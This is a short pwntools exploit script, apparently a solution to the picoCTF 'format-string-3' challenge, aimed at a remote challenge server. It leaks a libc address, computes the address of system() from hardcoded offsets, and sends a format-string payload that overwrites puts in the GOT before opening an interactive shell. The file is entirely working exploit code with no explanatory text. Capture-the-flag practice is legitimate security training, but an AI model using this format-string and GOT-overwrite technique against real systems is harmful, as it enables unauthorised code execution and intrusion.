#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'

def conn():
    # if args.LOCAL:
    #     r = process([exe.path])
    #     if args.DEBUG:
    #         gdb.attach(r)
    # else:
    r = remote("rhea.picoctf.net", 52872) # change the domain name and port number according to the challenge

    return r


elf = ELF("format-string-3")
puts_got = elf.got['puts']
print(hex(puts_got))

p = conn()
p.recvline()
setvbuf_mem = int(p.recvline()[-13:-1],16)
setvbuf_libc = 0x07a3f0
libc_base = setvbuf_mem-setvbuf_libc
system_libc = 0x4f760
system_mem = libc_base+system_libc
payload = fmtstr_payload(38, {puts_got: system_mem}) 

p.sendline(payload)
p.interactive()
